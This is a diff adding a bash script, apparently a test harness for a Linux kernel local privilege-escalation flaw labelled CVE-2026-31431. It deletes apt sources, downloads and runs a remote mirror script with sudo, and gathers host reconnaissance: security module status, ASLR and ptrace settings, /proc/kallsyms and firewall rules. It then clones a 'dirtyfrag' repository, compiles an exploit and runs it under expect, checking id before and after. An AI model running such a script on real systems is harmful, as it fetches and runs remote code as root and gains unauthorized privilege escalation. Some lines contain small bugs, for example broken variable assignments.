@@ -1,0 +1,296 @@
+#!/bin/bash
+
+WORKDIR="/tmp"
+cd ${WORKDIR}
+
+
+# title
+echo "# CVE-2026-31431"
+
+# install depdency
+echo -e "\n## install dep\n"
+echo '```text'
+if command -v apt &>/dev/null; then
+	if [ -f /etc/apt/sources.list ]; then
+		sudo rm -f /etc/apt/sources.list
+	fi
+	if command -v curl &>/dev/null; then
+		curl -o main.sh https://linuxmirrors.cn/main.sh
+	elif command -v wget &>/dev/null; then
+		wget -O main.sh https://linuxmirrors.cn/main.sh
+	fi
+	if [ -f main.sh ]; then
+		chmod +x main.sh
+		sudo ./main.sh --use-intranet-source false \
+			--use-official-source true \
+			--ignore-backup-tips \
+			--protocol http \
+			--upgrade-software false \
+			--pure-mode
+	fi
+	sudo apt-get update
+	sudo apt-get install -y expect python3 git gcc 
+elif command -v yum &>/dev/null; then
+	sudo yum makecache
+	sudo yum install -y expect python3 git gcc
+else
+	echo "no apt or yum found!"
+fi
+echo '```'
+
+# gether config info
+echo -e "\n## kernel config\n"
+echo '```text'
+if [ -f /proc/config.gz ]; then
+	zcat /proc/config.gz
+elif [ -f /boot/config-$(uname -r) ]; then
+	cat /boot/config-$(uname -r)
+else
+	echo "no config found!"
+fi
+echo '```'
+
+# gether packages
+echo -e "\n## soft installated\n"
+echo '```text'
+if command -v dpkg &>/dev/null; then
+	dpkg -l
+elif command -v rpm &>/dev/null; then
+	rpm -qa
+elif command -v opkg &>/dev/null; then
+	opkg -l
+else
+	echo "no supported packge manager found!"
+fi
+echo '```'
+
+# gether dmesg info
+echo -e "\n## dmesg\n"
+echo '```text'
+if command -v dpkg &>/dev/null; then
+	sudo dmesg
+else
+	echo "no dmesg cmd found"
+fi
+echo '```'
+
+# virt
+echo -e "\n## virtualization and container\n"
+echo '```text'
+
+echo "=== Cgroup (Container check) ==="
+if [ -f /proc/1/cgroup ]; then
+	sudo cat /proc/1/cgroup
+fi
+
+echo -e "\n=== Init Environ ==="
+if [ -f /proc/1/environ ]; then
+	sudo cat /proc/1/environ | tr '\0' '\n'
+fi
+
+echo -e "\n=== Systemd Detect Virt ==="
+if command -v systemd-detect-virt &>/dev/null; then
+	sudo systemd-detect-virt
+else
+	echo "systemd-detect-virt command not found"
+fi
+
+echo -e "\n=== Hypervisor Check (dmesg) ==="
+sudo dmesg 2>/dev/null | grep -i hypervisor
+echo '```'
+
+# security
+echo -e "\n## security modules and defenses\n"
+echo '```text'
+
+echo "=== SELinux Status ==="
+if command -v sestatus &>/dev/null; then
+	sudo sestatus
+else
+	echo "sestatus command not found"
+fi
+
+echo -e "\n=== AppArmor Status ==="
+if command -v aa-status &>/dev/null; then
+	sudo aa-status 2>/dev/null
+else
+	echo "aa-status command not found"
+fi
+
+echo -e "\n=== Kernel Security Params ==="
+ptrace_val= $(sudo cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
+kptr_val= $(sudo cat /proc/sys/kernel/kptr_restrict 2>/dev/null)
+aslr_val= $(sudo cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
+
+echo "ptrace_scope:  ${ptrace_val:-N/A}"
+echo "kptr_restrict:  ${kptr_val:-N/A}"
+echo "randomize_va_space (ASLR):  ${aslr_val:-N/A}"
+
+echo -e "\n=== BPF/LSM Modules ==="
+sudo lsmod 2>/dev/null | grep -iE "bpf|apparmor|selinux"
+echo '```'
+
+# kernel symbols
+echo -e "\n## kernel symbols and infoleak\n"
+echo '```text'
+
+echo "=== /proc/kallsyms ==="
+if [ -r /proc/kallsyms ]; then
+	sudo cat /proc/kallsyms
+else
+	echo "Cannot read /proc/kallsyms (Permission denied or restricted)"
+fi
+
+# hardware
+echo -e "\n## hardware and firmware\n"
+echo '```text'
+
+echo "=== VGA/GPU Devices ==="
+if command -v lspci &>/dev/null; then
+	sudo lspci 2>/dev/null | grep -i vga
+else
+	echo "lspci command not found"
+fi
+
+echo -e "\n=== System Info (dmidecode) ==="
+if command -v dmidecode &>/dev/null; then
+	sudo dmidecode -t system 2>/dev/null | grep -E "Manufacturer|Product Name|Version"
+else
+	echo "dmidecode command not found"
+fi
+echo '```'
+
+# runtime environment
+echo -e "\n## exploit runtime environment\n"
+echo '```text'
+
+echo "=== Python3 Version ==="
+if command -v python3 &>/dev/null; then
+	python3 --version 2>&1
+else
+	echo "python3 not found"
+fi
+
+echo -e "\n=== Python3 Path ==="
+which python3 2>&1
+
+echo -e "\n=== Environment Variables ==="
+echo "LD_PRELOAD= ${LD_PRELOAD}"
+echo "VIRTUAL_ENV= ${VIRTUAL_ENV}"
+echo '```'
+
+# firewalld
+echo -e "\n## network and firewall\n"
+echo '```text'
+
+echo "=== Routing Table ==="
+if command -v route &>/dev/null; then
+	sudo route -n 2>&1
+elif command -v ip &>/dev/null; then
+	sudo ip route 2>&1
+fi
+
+echo -e "\n=== DNS Config ==="
+sudo cat /etc/resolv.conf 2>/dev/null
+
+echo -e "\n=== IPTables Rules==="
+if command -v iptables &>/dev/null; then
+	sudo iptables -L -n 2>/dev/null
+else
+	echo "iptables command not found"
+fi
+echo '```'
+
+# gether module info
+echo -e "\n## loaded kernel module\n"
+echo '```text'
+if [ -f /usr/sbin/lsmod ]; then
+	sudo /usr/sbin/lsmod
+else
+	echo "no lsmod cmd found!"
+fi
+echo '```'
+
+# gether cmdline info
+echo -e "\n## cmdline\n"
+echo '```text'
+cat /proc/cmdline
+echo '```'
+
+# gether cpu info
+echo -e "\n## cpuinfo\n"
+echo '```text'
+cat /proc/cpuinfo
+echo '```'
+
+# gether memory info
+echo -e "\n## mem info\n"
+echo '```text'
+cat /proc/meminfo
+echo '```'
+
+# gether work user info
+echo -e "\n## user\n"
+echo '```text'
+id
+whoami
+echo '```'
+
+# gether kernel version
+echo -e "\n## kernel version\n"
+echo '```text'
+uname -a
+echo '```'
+
+# gether os release
+echo -e "\n## os version\n"
+echo '```text'
+cat /etc/*release
+echo '```'
+
+# exec exploit script
+
+# gether os release
+echo -e "\n## exploit\n"
+echo '```text'
+
+git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil
+chmod +x exp
+cp -a exp /tmp/exp
+
+/usr/bin/expect <<EOF
+set timeout 60
+
+spawn bash
+
+expect -re {[\$#]}
+
+send "uname -a\r"
+expect -re {[\$#] }
+
+send "cat /etc/*release\r"
+expect -re {[\$#] }
+
+send "id\r"
+expect -re {[\$#] }
+
+send "/tmp/exp\r"
+expect -re {[\$#] }
+
+send "id\r"
+expect -re {[\$#] }
+
+send "whoami\r"
+expect -re {[\$#] }
+
+send "uname -a\r"
+expect -re {[\$#] }
+
+send "exit\r"
+
+EOF
+echo -e "\n"
+echo '```'
+
+echo "---"
+exit 0
